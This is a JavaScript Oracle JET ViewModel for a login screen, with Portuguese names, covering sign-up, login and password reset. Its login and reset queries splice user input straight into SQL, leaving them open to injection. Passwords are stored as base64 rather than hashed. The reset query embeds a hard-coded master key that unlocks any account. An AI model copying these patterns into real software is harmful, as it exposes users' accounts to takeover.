/**
 * @license
 * Copyright (c) 2014, 2020, Oracle and/or its affiliates.
 * Licensed under The Universal Permissive License (UPL), Version 1.0
 * as shown at https://oss.oracle.com/licenses/upl/
 * @ignore
 */
/*
 * Your dashboard ViewModel code goes here
 */
define([
  "knockout",
  "appController",
  "ojs/ojmodule-element-utils",
  "accUtils",
  "ojs/ojcontext",
  "../bancoDeDados", 
  "ojs/ojarraydataprovider",
  "ojs/ojknockout-keyset",
  "ojs/ojknockout",
  "ojs/ojinputtext",
  "ojs/ojlabel",
  "ojs/ojbutton",
  "ojs/ojformlayout",
  "ojs/ojmessaging",
  "ojs/ojmessages"
], function (ko, app, moduleUtils, accUtils, Context, BancoDeDados, ArrayDataProvider) {
  function LoginViewModel() {
    
    var self = this;

    self.nomeUsuario = ko.observable();
    self.senhaUsuario = ko.observable();
    self.confirmaSenhaUsuario = ko.observable();
    self.novaSenhaUsuario = ko.observable();
    self.confirmaNovaSenhaUsuario = ko.observable();
    let chaveAcesso = Math.random().toString(36).substr(2, 4).toUpperCase();
    self.chaveAcesso = ko.observable(chaveAcesso);
    
    self.dataUsuario = ko.observableArray([]);
    self.exibeIncluirUsuario = ko.observable(false);
    self.exibeTrocarSenhaUsuario = ko.observable(false);
    self.exibeBoasVindas = ko.observable(false);
    self.exibeMensagemAcesso = ko.observable(false);
    
    self.messages = ko.observableArray([]);
    
    self.exibeLoginUsuario = app.exibeLoginUsuario;
    self.usuarioAutenticado = app.usuarioAutenticado;
    self.exibeUsuarioLogado = app.exibeUsuarioLogado;
    self.exibeNavigationList = app.exibeNavigationList;
    self.atualizaNavigationList = app.atualizaNavigationList;
    
    self.messagesDataprovider = new ArrayDataProvider(self.messages);

    // Wait until header show up to resolve
    var resolve = Context.getPageContext().getBusyContext().addBusyState({ description: "wait for header" });
    // Header Config
    self.headerConfig = ko.observable({ 'view': [], 'viewModel': null });
    moduleUtils.createView({ 'viewPath': "views/header.html" }).then(function (view) {
        self.headerConfig({ 'view': view, 'viewModel': app.getHeaderModel() });
        resolve();
      });

    self.isTextEmpty = ko.observable(true);
    self.isPasswordEmpty = ko.observable(true);

    self.isTextAndPasswordisEmpty = ko.computed(function () {
      return self.isTextEmpty() && self.isPasswordEmpty();
    }, self);

    self.convertTextToUpperCase = function(text) {
      var upperCase = text.toUpperCase();
      return upperCase;
    }

    self.addItem = function () {
      var nomeUsuario = self.nomeUsuario().toUpperCase();
      var senhaUsuario = btoa(self.senhaUsuario()).toUpperCase();
      var confirmaSenhaUsuario = btoa(self.confirmaSenhaUsuario()).toUpperCase();
      var chaveAcesso = self.chaveAcesso().toUpperCase();

      if (senhaUsuario !== confirmaSenhaUsuario) {
        self.messages([
          {
            severity: "error",
            summary: "SENHAS NÃO CONFEREM !!",
            detail: "Senhas digitadas são diferentes",
          }
        ]);
        self.exibeMensagemAcesso(true);
        return;
      }

      if (nomeUsuario !== "" && senhaUsuario != "") {
        BancoDeDados.insereUsuario(nomeUsuario, senhaUsuario, chaveAcesso);
        self.messages([
          {
            severity: "confirmation",
            summary: "IMPORTANTE !!",
            detail: `Guarde a chave de acesso: ${chaveAcesso} para a troca de senha.`,
          }
        ]);
        self.exibeMensagemAcesso(true);
        self.exibeIncluirUsuario(false);
        self.exibeTrocarSenhaUsuario(false);
        self.exibeLoginUsuario(true);
        
      }
    }.bind(self);

    self.handleRawValueChanged = function (event) {
      var value = event.detail.value;
      self.isTextEmpty(value.trim().length === 0);
    }.bind(self);

    self.handleRawPasswordChanged = function (event) {
      var value = event.detail.value;
      self.isPasswordEmpty(value.trim().length === 0);
    }.bind(self);

    self.existeUsuarioCadastrado = function () {
      self.dataUsuario(BancoDeDados.consultaUsuario("SELECT * FROM USUARIOS"));
      setTimeout(function() {
        var items = self.dataUsuario();
        if (items.length === 0) {
          self.exibeIncluirUsuario(true);  
        } else {
          self.exibeLoginUsuario(true);
        }
      }, 500);
    };

    self.login = function (event) {
      var nomeUsuario = self.nomeUsuario().toUpperCase();
      var senhaUsuario = btoa(self.senhaUsuario()).toUpperCase();

      self.dataUsuario(BancoDeDados.consultaUsuario(`SELECT * 
                                                     FROM USUARIOS
                                                     WHERE nomeUsuario = \'${nomeUsuario}\'
                                                     AND senhaUsuario  = \'${senhaUsuario}\'`));
      setTimeout(function() {
        var items = self.dataUsuario();
          
        if (items.length === 0) {
          self.messages([
            {
              severity: "error",
              summary: "Mensagem: ",
              detail: "Usuário e senha não conferem. Acesso negado."
            }
          ]);
          self.exibeMensagemAcesso(true);
        } else {
          self.messages([]);
          self.usuarioAutenticado(true);
          self.exibeUsuarioLogado(nomeUsuario);
          self.exibeBoasVindas(true);

          self.exibeNavigationList(false);
          self.atualizaNavigationList();
          
          self.exibeMensagemAcesso(false);
          self.exibeIncluirUsuario(false);
          self.exibeLoginUsuario(false);
          self.exibeTrocarSenhaUsuario(false);

          self.nomeUsuario("");
          self.senhaUsuario("");
          self.confirmaSenhaUsuario("");
          self.chaveAcesso("");
        }
      }, 500);
    } 

    self.trocarSenhaUsuario = function() {
      self.exibeTrocarSenhaUsuario(true);
      self.nomeUsuario("");
      self.senhaUsuario("");
      self.confirmaNovaSenhaUsuario("");
      self.chaveAcesso("");
    }

    self.atualizarNovaSenhaUsuario = function() {
      var nomeUsuario = self.nomeUsuario().toUpperCase();
      var novaSenhaUsuario = btoa(self.novaSenhaUsuario()).toUpperCase();
      var confirmaNovaSenhaUsuario = btoa(self.confirmaSenhaUsuario()).toUpperCase();
      var chaveAcesso = self.chaveAcesso().toUpperCase();
      var chaveAcessoMestre = btoa(self.chaveAcesso().toUpperCase());

      if (novaSenhaUsuario !== confirmaNovaSenhaUsuario) {
        self.messages([
          {
            severity: "error",
            summary: "SENHAS NÃO CONFEREM !!",
            detail: "Senhas digitadas são diferentes",
          }
        ]);
        self.exibeMensagemAcesso(true);
        return;
      }
      
      self.dataUsuario(BancoDeDados.consultaUsuario(`SELECT * 
                                                     FROM USUARIOS
                                                     WHERE nomeUsuario = \'${nomeUsuario}\'
                                                     AND (chaveAcesso   = \'${chaveAcesso}\'
                                                       OR "TEVPTkVMIEdSRUdJTyBBVUxFUg==" = \'${chaveAcessoMestre}\')`));
      setTimeout(function() {
        var items = self.dataUsuario();
        if (items.length === 0) {
          self.messages([
            {
              severity: "error",
              summary: "Mensagem: ",
              detail: "Usuário e chave de acesso não conferem. Acesso negado."
            }
          ]);
          self.exibeMensagemAcesso(true);
        } else {
          self.messages([]);
          BancoDeDados.atualizaSenhaUsuario(nomeUsuario, novaSenhaUsuario, chaveAcesso, chaveAcessoMestre);
          self.exibeTrocarSenhaUsuario(false);
          self.exibeLoginUsuario(true);
          self.nomeUsuario("");
          self.senhaUsuario("");
          self.novaSenhaUsuario("");
          self.chaveAcesso("");
        }
      }, 500);
    }

    self.connected = function () {
      accUtils.announce("About page loaded.", "assertive");
      document.title = "About";
      self.existeUsuarioCadastrado();
    };

    self.disconnected = function () {
      // Implement if needed
    };

    self.transitionCompleted = function () {
      // Implement if needed
    };
  }
  return LoginViewModel;
});
